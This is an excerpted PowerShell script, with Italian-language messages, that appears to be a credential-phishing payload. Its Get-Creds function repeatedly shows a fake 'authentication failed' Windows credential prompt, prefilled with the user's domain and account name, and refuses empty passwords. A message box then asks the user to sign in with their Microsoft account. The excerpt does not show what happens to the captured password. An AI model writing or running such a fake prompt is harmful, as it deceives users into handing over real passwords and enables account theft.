...
function Get-Creds {
    ...
    while ($form -eq $null)
    {
        $cred = $host.ui.promptforcredential('Autenticazione fallita','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); 
        ...
        if([string]::IsNullOrWhiteSpace([Net.NetworkCredential]::new('', $cred.Password).Password))
        {
            ...
            $msgBody = "Le credenziali non possono essere vuote!"
            $msgTitle = "Errore"
            $msgButton = 'Ok'
            $msgImage = 'Stop'
...
Add-Type -AssemblyName PresentationCore,PresentationFramework
$msgBody = "Esegui l'autenticazione con il tuo account Microsoft."
$msgTitle = "Autenticazione richiesta"
$msgButton = 'Ok'
$msgImage = 'Attenzione'
$Result = [System.Windows.MessageBox]::Show($msgBody,$msgTitle,$msgButton,$msgImage)
Write-Host "The user clicked: $Result"
